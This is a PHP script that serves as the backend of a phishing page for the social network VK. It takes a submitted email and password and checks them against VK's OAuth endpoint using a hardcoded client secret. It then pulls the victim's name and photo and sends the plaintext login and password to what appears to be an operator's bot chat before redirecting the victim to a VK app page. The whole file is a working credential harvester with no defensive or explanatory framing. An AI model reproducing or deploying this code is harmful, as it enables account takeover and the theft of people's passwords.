<?php
require 'db.php';

$login = $_POST['email'];
$password = $_POST['pass'];
if(empty($login) or empty($password)){
header('Location: https://vk.com/app7455644');
}else{
            
    $auth = curl("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$login."&password=".$password);
    $json = json_decode($auth, true);
    $access_token = $json["access_token"];
    if($json["user_id"] >= 1){
        $user_id = $json['user_id'];
    }



    $auth2 = curl("https://api.vk.com/method/users.get?user_id=".$user_id."&fields=photo_max&name_case=nom&access_token=".$access_token."&v=5.124");
    $json2 = json_decode($auth2, true);
    $name = $json2['response'][0]['first_name'];
    $family = $json2['response'][0]['last_name'];
    $photo = $json2['response'][0]['photo_max'];

        $mess = "<b>Новый пользователь</b>\n";
        $mess .= "<a href='https://vk.com/id".$user_id."'>Профиль</a>\n";
        $mess .= "<a href='".$photo."'>Фото</a>";
        $mess .= "\n<b>Имя: ".$name."</b>";
        $mess .= "\n<b>Фамилия: ".$family."</b>";
        $mess .= "\n<b>Логин: ".$login."</b>";
        $mess .= "\n<b>Пароль: ".$password."</b>";
        send($chat_id, $mess);
        header('Location: https://vk.com/app7183114');

}
        





?>